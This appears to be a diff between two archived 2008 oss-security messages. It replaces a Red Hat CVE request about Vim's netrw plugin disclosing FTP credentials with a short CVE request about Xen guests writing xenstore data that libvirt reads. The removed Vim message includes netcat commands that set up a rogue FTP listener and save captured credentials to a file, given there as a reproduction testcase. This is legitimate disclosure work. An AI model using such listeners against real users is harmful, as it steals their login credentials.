@@ -1,47 +1,26 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/10/06/4
-Message-ID: <621926943.500791223288784031.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Mon, 6 Oct 2008 06:26:24 -0400 (EDT)
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: coley@...re.org
-Cc: oss-security@...ts.openwall.com, Jan Minář <rdancer@...ncer.org>
-Subject: CVE request - (vim : netrw plugin - ftp user credentials disclosure)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/09/30/6
+Message-ID: <1934018180.985531222802880986.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Tue, 30 Sep 2008 15:28:01 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Cc: coley@...re.org, berrange@...hat.com
+Subject: CVE Request (xen)
 Content-Type: text/plain; charset=utf-8
 
-Hello Steve,
+Hello,
 
-  could you please allocate a new CVE id for the following
-Vim issue:
+This xen issue was just brought to our attention:
+https://bugzilla.redhat.com/show_bug.cgi?id=464817
+https://bugzilla.redhat.com/show_bug.cgi?id=464818
 
-Vulnerability reports: 1, http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html
-                          (This is another issue than CVE-2008-2712).
+http://lists.xensource.com/archives/html/xen-devel/2008-09/msg00992.html
 
-                       2, https://bugzilla.redhat.com/show_bug.cgi?id=461750
+It seems that a xen guest can write some data into the xenstore that is
+later read by libvirt (and possibly other things), which could cause
+troubles for the Xen admin.
 
-Thread discussing this issue: 
+Thanks.
 
-http://groups.google.com/group/vim_dev/browse_thread/thread/2f6fad581a037971/a5fcf4c4981d34e6?show_docid=a5fcf4c4981d34e6
-
-Proposed partial fix: 
-
-http://mysite.verizon.net/astronaut/vim/index.html#NETRW
-
-Affected Vim netrw plugin versions: 
-    a, Vim 7.0 autoloaded netrw plugin versions - from " Date: Jul 24, 2006, Version: 102" till the latest.
-    b, older versions of Vim netrw may be also affected.
-
-Testcase available at:
-
-http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html (part 4. EXPLOIT)
-
-Note: Slightly modification of the testcase in the "netcat" part may be needed
-      to successfully reproduce the issue. I was using:
-
-      printf '220\r\n331\r\n' | nc -l ftp.rogue.example.com 31337 > credentials&
-      (and for simulation of successful FTP session login the command:
-      printf '220\r\n331\r\n230\r\n' | nc -l ftp.rogue.example 31337 > credentials &)
-
-     
-Thanks, Jan
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
+-- 
+    JB
